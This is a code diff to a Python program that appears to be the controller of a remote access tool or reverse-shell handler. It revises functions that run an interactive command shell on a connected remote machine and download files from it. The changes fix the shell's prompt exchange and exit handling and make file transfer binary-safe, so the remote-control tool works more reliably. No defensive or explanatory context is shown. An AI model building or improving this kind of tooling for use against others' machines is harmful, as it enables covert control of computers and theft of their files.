@@ -35,11 +35,14 @@ def send_notification(conn, address):
     input("OK")
 
 def json_receive(conn):
-    json_data = ""
     try:
-        json_data = json_data + recv_data(conn)
-    except:pass
-    return simplejson.loads(json_data)
+        raw_data = recv_data(conn)
+        if not raw_data:
+            return {}
+        return simplejson.loads(raw_data)
+    except Exception as e:
+        print(Fore.LIGHTRED_EX + f"[!] JSON Receive Error: {e}")
+        return {}
 
 def json_send(conn, data):
     try:
@@ -85,11 +88,14 @@ def shell(conn, address):
     send_data(conn, b"MODE_SHELL")
     try:
         while True:
-            cmd = input(getInput(conn))
+            send_data(conn, b"SHELLINFO")
+            prompt_text = recv_data(conn)
+            cmd = input(prompt_text)
             if not cmd.strip():
                 continue
             if cmd == 'exit':
                 system.clear_screen()
+                send_data(conn, b"exit")
                 break
             send_data(conn, cmd.encode())
             if cmd == 'clear':
@@ -131,8 +137,8 @@ def download(conn, address):
     try:
         send_data(conn, b'control')
 
-        data = recv_data(conn)
-        with open(name, 'w') as f:
+        data = recv_data(conn, decode=False)
+        with open(name, 'wb') as f:
             f.write(data)
     except Exception as error: 
         print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
